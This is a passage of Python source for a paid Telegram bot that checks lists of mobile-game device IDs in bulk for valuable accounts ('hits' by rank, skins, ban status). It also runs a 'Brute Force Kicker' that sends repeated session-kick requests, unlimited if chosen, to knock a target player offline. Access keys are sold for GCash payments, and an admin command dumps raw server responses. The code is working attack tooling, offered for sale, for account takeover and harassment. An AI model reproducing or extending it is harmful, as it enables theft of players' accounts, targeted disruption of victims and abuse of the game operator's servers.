    count = 0; success_count = 0; fail_count = 0; latencies = []
    bf_start = time.time()

    def update():
        elapsed  = int(time.time() - bf_start)
        avg_lat  = sum(latencies)/len(latencies) if latencies else 0
        succ_pct = (success_count / max(count, 1) * 100)
        speed    = count / max(elapsed, 1)
        loop_str = f"{count}/{loops}" if loops > 0 else f"{count}/∞"
        text = (
            f"⚡ *Brute Force Kicker*\n{'─'*32}\n\n"
            f"👤 Target : `{profile['nickname']}` (ID: {profile['account_id']})\n"
            f"🌐 Server : `{profile['gs_info']}`\n\n"
            f"🔄 Loops  : `{loop_str}`\n"
            f"✅ Success: `{success_count}` ({succ_pct:.1f}%)\n"
            f"❌ Failed : `{fail_count}`\n"
            f"⚡ Avg Lat: `{avg_lat:.0f}ms`\n"
            f"🏃 Speed  : `{speed:.2f} kick/s`\n"
            f"⏱ Elapsed: `{elapsed}s`\n"
        )
        kb = [[InlineKeyboardButton("🛑 Stop BF", callback_data=f"stop_bf_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=text, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(kb)
                ), loop
            )
            fut.result(timeout=10)
        except: pass

    last_update = [0.0]
    while not stop_ev.is_set():
        count += 1
        ok, lat, desc = send_session_kick(profile)
        latencies.append(lat)
        if ok: success_count += 1
        else:  fail_count    += 1
        now = time.time()
        if now - last_update[0] >= 2.0:
            last_update[0] = now
            try: update()
            except: pass
        if loops > 0 and count >= loops: break
        if delay > 0: time.sleep(delay)

    elapsed  = int(time.time() - bf_start)
    avg_lat  = sum(latencies)/len(latencies) if latencies else 0
    succ_pct = (success_count / max(count, 1) * 100)
    speed    = count / max(elapsed, 1)
    summary  = (
        f"📊 *Brute Force Summary*\n{'─'*32}\n\n"
        f"👤 Target  : `{profile['nickname']}`\n"
        f"🔄 Loops   : `{count}`\n"
        f"✅ Success : `{success_count}` ({succ_pct:.1f}%)\n"
        f"❌ Failed  : `{fail_count}`\n"
        f"⚡ Avg Lat : `{avg_lat:.0f}ms`\n"
        f"🏃 Speed   : `{speed:.2f} kick/s`\n"
        f"⏱ Duration: `{elapsed}s`\n\n"
        f"👑 *{BRAND}*"
    )
    try:
        fut = asyncio.run_coroutine_threadsafe(
            app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=summary, parse_mode="Markdown"
            ), loop
        )
        fut.result(timeout=20)
    except Exception as e:
        log.error(f"BF summary edit: {e}")

    with _bf_lock: _bf_stop_flags.pop(user_id, None)
    with job_lock: active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    auth, reason = await user_manager.is_authorized(uid)

    if auth:
        user_info = await user_manager.get_user_info(uid)
        stats     = user_info.get("stats", {})
        expiry_s  = user_info.get("key_expiry")
        if expiry_s:
            try:
                exp = datetime.fromisoformat(expiry_s)
                exp_display = "Lifetime" if exp.year == 9999 else exp.strftime("%Y-%m-%d %H:%M")
            except: exp_display = "Unknown"
        else: exp_display = "None"

        text = (
            f"🔥 *{BOT_NAME.upper()}*\n"
            f"👑 Created by: {BRAND}\n\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"📊 *YOUR STATS*\n"
            f"┣ 🔍 Checked : `{stats.get('total_checked',0)}`\n"
            f"┗ 🎯 Hits    : `{stats.get('total_hits',0)}`\n\n"
            f"🔑 *ACCESS*\n"
            f"┗ ⏳ Expiry  : `{exp_display}`\n\n"
            f"⏱ Uptime    : `{int(time.time() - start_time)}s`\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"📤 *Choose a tool below.*"
        )
        kb = kb_main_admin() if uid == OWNER_ID else kb_main_user()
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    else:
        await update.message.reply_text(
            f"🚫 *ACCESS RESTRICTED*\n"
            f"👑 {BOT_NAME} · {BRAND}\n\n"
            f"This tool requires an access key.\n\n"
            f"💳 *GET ACCESS – GCash*\n"
            f"┣ 3 Days   · ₱50\n"
            f"┣ 7 Days   · ₱70\n"
            f"┣ 1 Month  · ₱100\n"
            f"┗ Lifetime · ₱150\n\n"
            f"📩 Contact admin {BRAND}\n"
            f"Use /redeem <key> if you already have a key.",
            parse_mode="Markdown", reply_markup=kb_no_key()
        )

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key     = ctx.args[0].strip()
    success, msg = await user_manager.redeem_key(uid, key)
    if success:
        user_info = await user_manager.get_user_info(uid)
        exp       = datetime.fromisoformat(user_info["key_expiry"])
        await update.message.reply_text(
            f"✅ *KEY REDEEMED!*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Key     : `{key}`\n"
            f"⏳ Valid until: `{exp.strftime('%Y-%m-%d %H:%M')}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Use /start to begin.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📖 *{BOT_NAME} Help*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *Bulk Check* – Send a `.txt` file with device IDs\n"
        f"🔍 *Single Check* – Send one device ID as text\n"
        f"📊 *Statistics* – View hit counters\n\n"
        f"`/redeem <key>` — Activate key\n"
        f"`/start` — Dashboard\n"
        f"`/stop` — Stop job\n\n"
        f"👑 {BRAND}",
        parse_mode="Markdown"
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        job = active_jobs.get(uid)
    if job:
        job["stopped"] = True
        with _bf_lock:
            ev = _bf_stop_flags.get(uid)
            if ev: ev.set()
        await update.message.reply_text("🛑 Stopping...")
    else:
        await update.message.reply_text("No active job.")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        job = active_jobs.get(uid)
    if job:
        await update.message.reply_text(
            f"⚡ Job running — `{job.get('checked',0)}/{job.get('total',0)}` checked",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("No active job.")

@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👑 *Admin Panel*", reply_markup=kb_admin_main(), parse_mode="Markdown")

@admin_only
async def cmd_raw(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Dump ALL raw server responses for a device_id — tag-hunting tool."""
    if not ctx.args:
        await update.message.reply_text("Usage: `/raw <device_id>`", parse_mode="Markdown"); return
    device_id = " ".join(ctx.args).strip()
    msg = await update.message.reply_text(f"🔬 Dumping raw responses for `{device_id}`...", parse_mode="Markdown")

    acc, zone, stat = await asyncio.to_thread(lambda: GameLogin(device_id).run())
    if not acc or not zone:
        await msg.edit_text(f"❌ Login failed: `{stat}`", parse_mode="Markdown"); return

    def _dump():
        try:
            with GameConnection(device_id=device_id) as conn:
                conn.login_to_login_server()
                conn.get_game_server()
                conn.connect_to_game_server()
                conn.get_skin_role_info(acc, zone)
                conn.check_ban_status()
                get_v2l_status(conn, acc, zone)
                conn.lookup_player(acc)
                conn.get_role_info(acc, zone)
                conn.get_player_detail(acc, zone)
                conn.get_guild_info(acc, zone)
                conn.get_hero_history(acc, zone)
                conn.get_collector_info(acc, zone)
                return conn.debug_responses
        except Exception as e:
            return [{"error": str(e)}]

    bundle = await asyncio.to_thread(_dump)
    pretty = json.dumps(bundle, indent=2, default=str)

    # Save to file (may exceed Telegram limit)
    raw_path = os.path.join(DATA_DIR, f"raw_{acc}_{zone}.json")
    with open(raw_path, "w", encoding="utf-8") as f:
        f.write(pretty)

    # Split into chunks for Telegram
    CHUNK = 3500
    chunks = [pretty[i:i+CHUNK] for i in range(0, len(pretty), CHUNK)]
    await msg.edit_text(
        f"🔬 Raw dump for `{acc}:{zone}` — {len(chunks)} chunk(s). Sending now...",
        parse_mode="Markdown"
    )
    for i, ch in enumerate(chunks[:8]):
        await ctx.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"📄 *chunk {i+1}/{min(len(chunks),8)}*\n```\n{ch}\n```",
            parse_mode="Markdown"
        )
    if len(chunks) > 8:
        with open(raw_path, "rb") as f:
            await ctx.bot.send_document(
                chat_id=update.effective_chat.id, document=f,
                filename=f"raw_{acc}_{zone}.json"
            )

@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args  = ctx.args or []
    usage = "`/genkey hours 24 1`\n`/genkey days 7 1`\n`/genkey months 1 1`\n`/genkey lifetime 1`"
    try:
        if not args: raise ValueError
        dt = args[0].lower()
        if dt not in ("hours","days","months","lifetime"): raise ValueError
        if dt == "lifetime":
            dv = 0; mu = int(args[1]) if len(args) > 1 else 1
        else:
            if len(args) < 3: raise ValueError
            dv = int(args[1]); mu = int(args[2])
            if dv < 1: raise ValueError
        if mu < 1: raise ValueError
    except:
        await update.message.reply_text(f"Usage:\n{usage}", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    key = keys[0]
    exp = user_manager.keys["keys"][key]["expiry"]
    dd  = {"hours":f"{dv}h","days":f"{dv}d","months":f"{dv}mo","lifetime":"Lifetime"}[dt]
    await update.message.reply_text(
        f"🔑 *Key Generated!*\n━━━━━━━━━━━━━━━━━━━━\n`{key}`\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Duration : `{dd}`\nExpires  : {fmt_expiry(exp)}\nMax users: `{mu}`",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_ban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/ban_user <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.ban_user(int(t))
    await update.message.reply_text(f"User `{t}` {'banned' if ok else 'not found'}.", parse_mode="Markdown")

@admin_only
async def cmd_unban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/unban_user <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.unban_user(int(t))
    await update.message.reply_text(f"User `{t}` {'unbanned' if ok else 'not found'}.", parse_mode="Markdown")

@admin_only
async def cmd_addvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/addvip <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.add_vip(int(t))
    await update.message.reply_text(f"VIP {'granted to' if ok else 'not found for'} `{t}`.", parse_mode="Markdown")

@admin_only
async def cmd_removevip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/removevip <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.remove_vip(int(t))
    await update.message.reply_text(f"VIP {'removed from' if ok else 'not found for'} `{t}`.", parse_mode="Markdown")

@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = await user_manager.get_all_users()
    total  = len(users)
    active = sum(1 for u in users.values() if u.get("activated"))
    banned = sum(1 for u in users.values() if u.get("banned"))
    vip    = sum(1 for u in users.values() if u.get("vip"))
    with COUNTER_LOCK:
        rank_stats = "\n".join(
            f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`"
            for r in ['warrior','elite','master','gm','epic','legend','mythic']
        )
    await update.message.reply_text(
        f"📊 *Bot Statistics*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Users: `{total}` · Active: `{active}` · VIP: `{vip}` · Banned: `{banned}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n*Rank Hits:*\n{rank_stats}\n━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast Your message`", parse_mode="Markdown"); return
    msg   = " ".join(ctx.args)
    users = await user_manager.get_all_users()
    sent  = 0; failed = 0
    status_msg = await update.message.reply_text(f"📢 Broadcasting to `{len(users)}` users...", parse_mode="Markdown")
    for uid in users:
        try:
            await ctx.bot.send_message(
                chat_id=int(uid),
                text=f"📢 *Announcement*\n━━━━━━━━━━━━━━━━━━━━\n{msg}\n━━━━━━━━━━━━━━━━━━━━\n👑 {BRAND}",
                parse_mode="Markdown"
            )
            sent += 1
        except: failed += 1
        await asyncio.sleep(0.06)
    await status_msg.edit_text(
        f"✅ *Broadcast complete*\n━━━━━━━━━━━━━━━━━━━━\nDelivered: `{sent}`\nFailed: `{failed}`",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_remove_key(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/remove_key <user_id>`", parse_mode="Markdown"); return
    t     = ctx.args[0].strip()
    users = await user_manager.get_all_users()
    if t not in users:
        await update.message.reply_text(f"User `{t}` not found.", parse_mode="Markdown"); return
    users[t]["activated"] = False
    users[t]["key_expiry"]= None
    await user_manager._save_users()
    await update.message.reply_text(f"Key removed for user `{t}`.", parse_mode="Markdown")

@admin_only
async def cmd_setthreads(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args or []) != 2:
        await update.message.reply_text(f"Usage: `/setthreads <user_id> <limit>` (1–{MAX_THREADS_LIMIT})", parse_mode="Markdown"); return
    try:
        target = int(ctx.args[0]); limit = int(ctx.args[1])
        ok = await user_manager.set_threads_limit(target, limit)
        await update.message.reply_text(
            f"Threads for `{target}` {'set to' if ok else 'failed —'} `{limit}`.",
            parse_mode="Markdown"
        )
    except ValueError:
        await update.message.reply_text("Invalid numbers.", parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# DOCUMENT HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(
            f"🚫 Access denied: `{reason}`\nUse /redeem <key> to activate.",
            parse_mode="Markdown"
        ); return

    with job_lock:
        wants_bulk = active_jobs.get(uid, {}).get("awaiting_bulk_file")

    if not wants_bulk:
        await update.message.reply_text(
            "Use /start → 🔥 Bulk Check first, then send your `.txt` file.",
            parse_mode="Markdown"
        ); return

    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ You already have an active job. Use /stop first.")
            return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file with device IDs."); return

    file  = await ctx.bot.get_file(doc.file_id)
    data  = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]

    if not lines:
        await update.message.reply_text("No device IDs found in file."); return

    threads = await user_manager.get_threads_limit(uid)

    prog_msg = await update.message.reply_text(
        f"⚡ *{BOT_NAME} — Bulk Check*\n{'─'*32}\n\n"
        f"▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ *0.0%*\n\n"
        f"📦 Loaded `{len(lines)}` device IDs\n"
        f"🔄 Starting with `{threads}` threads...",
        parse_mode="Markdown"
    )

    job = {
        "user_id": uid, "chat_id": update.effective_chat.id,
        "msg_id":  prog_msg.message_id, "devices": lines,
        "threads": threads,
        "stopped": False, "checked": 0, "total": len(lines),
        "started": time.time(), "status": "running",
    }
    with job_lock:
        active_jobs[uid] = job
        active_jobs[uid].pop("awaiting_bulk_file", None)

    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

# ────────────────────────────────────────────────────────────────
# TEXT HANDLER
# ────────────────────────────────────────────────────────────────

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, reason = await user_manager.is_authorized(uid)

    with job_lock:
        awaiting_single = active_jobs.get(uid, {}).get("awaiting_single_device")
        awaiting_bf     = active_jobs.get(uid, {}).get("awaiting_bf_device")

    if awaiting_single and auth:
        device_id = update.message.text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_single_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)

        msg = await update.message.reply_text(
            f"🔍 *Checking device...*\n`{device_id}`",
            parse_mode="Markdown"
        )

        acc, zone, stat = await asyncio.to_thread(lambda: GameLogin(device_id).run())
        if not acc or not zone:
            await msg.edit_text(f"❌ Login failed: `{stat}`", parse_mode="Markdown"); return

        def _do_full():
            return process_detail(device_id, acc, zone, None, want_debug=False)

        ok, pd, _ = await asyncio.to_thread(_do_full)

        if not ok or not pd:
            await msg.edit_text(
                f"❌ Check failed for `{device_id}`\n"
                f"Login OK: `{acc}:{zone}` — but no detail returned. Try /raw (admin).",
                parse_mode="Markdown"
            ); return

        pd['account_id'] = acc
        pd['zone_id']    = zone
        card = format_card_v2(device_id, pd)
        await msg.edit_text(f"```\n{card}\n```", parse_mode="Markdown")

        is_banned = 'ban' in str(pd.get('ban_status', '')).lower()
        if not is_banned:
            await user_manager.update_stats(uid, checked=1, hits=1)
        else:
            await user_manager.update_stats(uid, checked=1, hits=0)
        return

    if awaiting_bf and auth:
        device_id = update.message.text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_bf_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)

        await update.message.reply_text(f"🔍 *Verifying device for BF...*\n`{device_id}`", parse_mode="Markdown")

        import concurrent.futures as cf
        with cf.ThreadPoolExecutor(1) as ex:
            try: profile = ex.submit(fetch_session_profile, device_id).result(timeout=30)
            except: profile = None

        if not profile:
            await update.message.reply_text("❌ Invalid or dead Device ID. Try again."); return

        await update.message.reply_text(
            f"✅ *Device Verified!*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Nickname : `{profile['nickname']}`\n"
            f"🆔 Account  : `{profile['account_id']}` (Zone {profile['zone_id']})\n"
            f"🏆 Rank     : {profile['rank']}\n"
            f"🎨 Skins    : `{profile['skin_count']}`\n"
            f"🌐 Server   : `{profile['gs_info']}`\n"
            f"⚡ Status   : {profile['ban_status']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\nSelect kick mode:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🧪 1x Test",         callback_data=f"bf_run:{device_id}:1:0")],
                [InlineKeyboardButton("⚡ 10x (2s delay)",   callback_data=f"bf_run:{device_id}:10:2")],
                [InlineKeyboardButton("🚀 50x (1s delay)",   callback_data=f"bf_run:{device_id}:50:1")],
                [InlineKeyboardButton("💥 100x (0.5s)",      callback_data=f"bf_run:{device_id}:100:0.5")],
                [InlineKeyboardButton("♾ Unlimited",         callback_data=f"bf_run:{device_id}:0:0")],
                [InlineKeyboardButton("❌ Cancel",            callback_data="bf_cancel")],
            ])
        )
        ctx.user_data[f"bf_profile_{uid}"] = profile
        return

# ────────────────────────────────────────────────────────────────
# PHOTO HANDLER
# ────────────────────────────────────────────────────────────────

async def on_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        plan_key = active_jobs.get(uid, {}).get("awaiting_receipt")
    if not plan_key: return

    plan       = GCASH_PLANS.get(plan_key, {})
    plan_label = plan.get("label", "Unknown")
    plan_price = plan.get("price", "?")
    username   = update.effective_user.username or update.effective_user.first_name or str(uid)

    with job_lock:
        active_jobs.get(uid, {}).pop("awaiting_receipt", None)
        if not active_jobs.get(uid): active_jobs.pop(uid, None)

    await update.message.reply_text(
        f"✅ *Receipt received!*\nPlan: {plan_label} ({plan_price})\nForwarded to admin.",
        parse_mode="Markdown"
    )

    caption = (
        f"💳 *NEW PAYMENT REQUEST!*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Buyer: @{username} (`{uid}`)\n"
        f"Plan: {plan_label} — {plan_price}\n"
        f"━━━━━━━━━━━━━━━━━━━━\nApprove or deny:"
    )
    photo = update.message.photo[-1]
    try:
        await ctx.bot.send_photo(
            chat_id=OWNER_ID, photo=photo.file_id,
            caption=caption, parse_mode="Markdown",
            reply_markup=kb_gcash_admin(str(uid), plan_key)
        )
    except Exception as e:
        log.error(f"Receipt forward failed: {e}")

# ────────────────────────────────────────────────────────────────
# CALLBACK HANDLER
# ────────────────────────────────────────────────────────────────

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    try: await query.answer()
    except BadRequest as e:
        if "Query is too old" not in str(e) and "query id is invalid" not in str(e): raise

    data = query.data
    uid  = update.effective_user.id

    if data == "tool_bulk":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth:
            await query.edit_message_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await query.edit_message_text("⚠️ Active job. Use /stop first."); return
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bulk_file"] = True
        await query.edit_message_text(
            "📤 *Bulk Check Mode*\nSend a `.txt` file with one Device ID per line.",
            parse_mode="Markdown"
        ); return

    if data == "tool_single":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth:
            await query.edit_message_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_single_device"] = True
        await query.edit_message_text(
            "🔍 *Single Account Check*\nSend the Device ID as a text message.",
            parse_mode="Markdown"
        ); return

    if data == "tool_stats":
        with COUNTER_LOCK:
            lines = ["📊 *Rank Hit Counters*\n━━━━━━━━━━━━━━━━━━━━"]
            for r in ['warrior','elite','master','gm','epic','legend','mythic']:
                lines.append(f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`")
            lines.append("━━━━━━━━━━━━━━━━━━━━")
            lines.append(f"┣ V2L Active  : `{HIT_COUNTERS.get('v2l_active',0)}`")
            lines.append(f"┣ V2L Inactive: `{HIT_COUNTERS.get('v2l_inactive',0)}`")
            lines.append(f"┣ Sultan      : `{HIT_COUNTERS.get('sultan',0)}`")
            lines.append(f"┗ Banned      : `{HIT_COUNTERS.get('banned',0)}`")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "menu_buy":
        await query.edit_message_text(
            f"💳 *GET ACCESS KEY*\nby {BRAND}\n━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 *PLANS*\n▸  3 Days      ₱50\n▸  7 Days      ₱70\n"
            f"▸  1 Month     ₱100\n◆  Lifetime    ₱150\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Tap a plan below to see payment steps.",
            parse_mode="Markdown", reply_markup=kb_gcash_plans()
        ); return

    if data == "menu_help":
        await query.edit_message_text(
            f"📖 *{BOT_NAME} Help*\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Bulk Check – send `.txt` file\n"
            f"🔍 Single Check – type one Device ID\n"
            f"📊 Statistics – rank hit counters\n\n"
            f"/redeem <key> · /stop · /start\n\n"
            f"👑 {BRAND}",
            parse_mode="Markdown"
        ); return

    if data.startswith("gcash_sel:"):
        plan_key = data.split(":", 1)[1]
        plan     = GCASH_PLANS.get(plan_key)
        if not plan:
            await query.answer("Unknown plan.", show_alert=True); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_receipt"] = plan_key
        await query.edit_message_text(
            f"💳 *PAYMENT STEPS*\nPlan: {plan['label']}  ·  Amount: {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n1. Open GCash\n2. Send to: `09910411990` (R.B.)\n"
            f"3. Amount: {plan['price']}\n4. Screenshot receipt\n"
            f"5. Send the photo here\n━━━━━━━━━━━━━━━━━━━━\nAdmin will approve within 5–30 minutes.",
            parse_mode="Markdown"
        ); return

    if data.startswith("gcash_approve:"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        keys, _ = await user_manager.generate_key(plan.get("dval", 1), plan.get("dtype", "days"), 1, 1)
        key  = keys[0] if keys else "ERROR"
        users = await user_manager.get_all_users()
        if buyer_uid not in users:
            await ctx.bot.send_message(chat_id=OWNER_ID, text=f"❌ User {buyer_uid} not found.")
            await query.answer("User not found.", show_alert=True); return
        users[buyer_uid]["activated"]  = True
        users[buyer_uid]["key_expiry"] = user_manager.keys["keys"][key]["expiry"]
        users[buyer_uid]["key_used"]   = key
        await user_manager._save_users()

        txn = get_next_txn_number()
        dur_display = plan.get('label', plan_key)
        await query.answer("✅ Approved!", show_alert=False)

        try:
            await ctx.bot.send_message(
                chat_id=OWNER_ID,
                text=f"✅ *APPROVED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\nKey    : `{key}`\nBuyer  : `{buyer_uid}`\n━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
        except: pass

        for attempt in range(3):
            try:
                await ctx.bot.send_message(
                    chat_id=int(buyer_uid),
                    text=f"✅ *PAYMENT APPROVED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\n🔑 Key : `{key}`\n━━━━━━━━━━━━━━━━━━━━\nUse `/redeem {key}` or tap /start.",
                    parse_mode="Markdown"
                )
                break
            except Exception as e:
                log.error(f"Approval notify {attempt+1}: {e}")
                await asyncio.sleep(1)
        return

    if data.startswith("gcash_deny:"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan        = GCASH_PLANS.get(plan_key, {})
        dur_display = plan.get('label', 'Unknown')
        txn         = get_next_txn_number()
        await query.answer("❌ Denied.", show_alert=False)

        try:
            await ctx.bot.send_message(
                chat_id=OWNER_ID,
                text=f"❌ *DENIED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\nBuyer  : `{buyer_uid}`\n━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown"
            )
        except: pass

        for attempt in range(3):
            try:
                await ctx.bot.send_message(
                    chat_id=int(buyer_uid),
                    text=f"❌ *PAYMENT DENIED — #{txn}*\n━━━━━━━━━━━━━━━━━━━━\nPlan   : `{dur_display}`\nPayment could not be verified.\nContact {BRAND}.",
                    parse_mode="Markdown"
                )
                break
            except Exception as e:
                log.error(f"Denial notify {attempt+1}: {e}")
                await asyncio.sleep(1)
        return

    if data.startswith("stop_") and not data.startswith("stop_bf_"):
        target = int(data.split("_")[1])
        if uid == target or uid == OWNER_ID:
            with job_lock:
                if target in active_jobs:
                    active_jobs[target]["stopped"] = True
            await query.edit_message_text("🛑 Job stopped.")
        else:
            await query.answer("Not your job!", show_alert=True)
        return

    if data.startswith("stop_bf_"):
        target = int(data.split("_")[2])
        if uid == target or uid == OWNER_ID:
            with _bf_lock:
                ev = _bf_stop_flags.get(target)
                if ev: ev.set()
            await query.edit_message_text("🛑 Brute force stopped.")
        else:
            await query.answer("Not your job!", show_alert=True)
        return

    if data.startswith("bf_run:"):
        parts = data.split(":")
        if len(parts) < 4:
            await query.answer("Invalid BF data.", show_alert=True); return
        device_id = parts[1]; loops = int(parts[2]); delay = float(parts[3])

        profile = ctx.user_data.get(f"bf_profile_{uid}")
        if not profile:
            await query.edit_message_text("❌ Profile expired. Run Single Check first."); return

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await query.edit_message_text("⚠️ Active job. Use /stop first."); return

        loop_label = f"{loops}x" if loops > 0 else "♾ Unlimited"
        prog_msg   = await ctx.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚡ *Brute Force Kicker — {loop_label}*\n{'─'*32}\n\n"
                 f"👤 Target : `{profile['nickname']}`\n🌐 Server : `{profile['gs_info']}`\n\nStarting...",
            parse_mode="Markdown"
        )

        stop_ev = threading.Event()
        with _bf_lock: _bf_stop_flags[uid] = stop_ev

        bf_job = {
            "user_id": uid, "chat_id": update.effective_chat.id,
            "msg_id": prog_msg.message_id, "profile": profile,
            "loops": loops, "delay": delay,
            "stop_event": stop_ev, "status": "running",
        }
        with job_lock: active_jobs[uid] = bf_job

        loop_obj = asyncio.get_event_loop()
        threading.Thread(target=run_bf_job, args=(bf_job, loop_obj, ctx.application), daemon=True).start()
        await query.edit_message_text(f"⚡ Brute Force started ({loop_label}).")
        return

    if data == "bf_cancel":
        await query.edit_message_text("❌ Brute force cancelled."); return

    if data == "open_admin_panel":
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return
        await query.edit_message_text("👑 *Admin Panel*", reply_markup=kb_admin_main(), parse_mode="Markdown"); return

    if data.startswith("adm_"):
        if uid != OWNER_ID:
            await query.answer("Admin only.", show_alert=True); return

        if data == "adm_refresh":
            cfg   = load_config()
            users = await user_manager.get_all_users()
            ac    = sum(1 for u in users.values() if u.get("activated"))
            bc    = sum(1 for u in users.values() if u.get("banned"))
            vc    = sum(1 for u in users.values() if u.get("vip"))
            lock_s = "🔒 LOCKED" if cfg.get("locked") else "🔓 Open"
